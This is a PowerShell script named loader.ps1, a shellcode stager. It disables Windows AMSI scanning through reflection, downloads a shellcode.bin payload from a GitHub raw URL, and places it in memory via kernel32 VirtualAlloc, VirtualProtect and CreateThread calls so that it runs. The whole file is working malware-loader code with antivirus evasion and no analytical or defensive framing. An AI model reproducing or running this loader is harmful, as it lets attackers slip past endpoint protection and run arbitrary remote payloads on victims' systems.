# loader.ps1 - Donut shellcode fetch & execute (fixed WaitForSingleObject)

try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        .GetField('amsiInitFailed','NonPublic,Static')
        .SetValue($null,$true)
} catch {}

$url = "https://github.com/MJansen6/bp/raw/refs/heads/main/shellcode.bin"
$wc = New-Object Net.WebClient
$shellcode = $wc.DownloadData($url)

$size = $shellcode.Length

Add-Type -MemberDefinition @"
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
"@ -Name Win32 -Namespace Native -PassThru

$addr = [Native.Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$size, 0x3000, 0x04)  # MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE

if ($addr -eq [IntPtr]::Zero) { throw "VirtualAlloc failed" }

[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)

$oldProtect = 0
$success = [Native.Win32]::VirtualProtect($addr, [uint32]$size, 0x20, [ref]$oldProtect)  # PAGE_EXECUTE_READ

if (-not $success) { throw "VirtualProtect failed" }

$tid = 0
$thread = [Native.Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)

if ($thread -eq [IntPtr]::Zero) { throw "CreateThread failed" }

# Fixed: use unsigned max value for INFINITE wait
[Native.Win32]::WaitForSingleObject($thread, [uint32]::MaxValue)
